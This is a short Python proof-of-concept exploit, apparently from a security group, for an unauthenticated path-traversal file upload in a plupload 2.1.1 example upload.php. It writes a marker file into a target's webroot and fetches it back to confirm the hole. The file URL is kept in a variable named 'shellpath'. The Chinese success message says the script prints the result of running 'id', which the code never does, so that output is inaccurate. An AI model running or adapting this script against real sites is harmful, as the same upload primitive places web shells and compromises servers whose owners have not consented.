#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/newplugins/js/plupload-2.1.1/examples/upload.php?name=../../webroot/vulntest.txt"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"}
    burp0_data = "vulntest"
    r1 = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    if r1.status_code == 200:
        shellpath = site + "/vulntest.txt"
        r2 = requests.get(shellpath, headers=burp0_headers, verify=False)
        if r2.status_code == 200 and "vulntest" in r2.text:
            return shellpath
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行命令 id 的结果为：", info)
    else:
        print("[-]漏洞不存在")
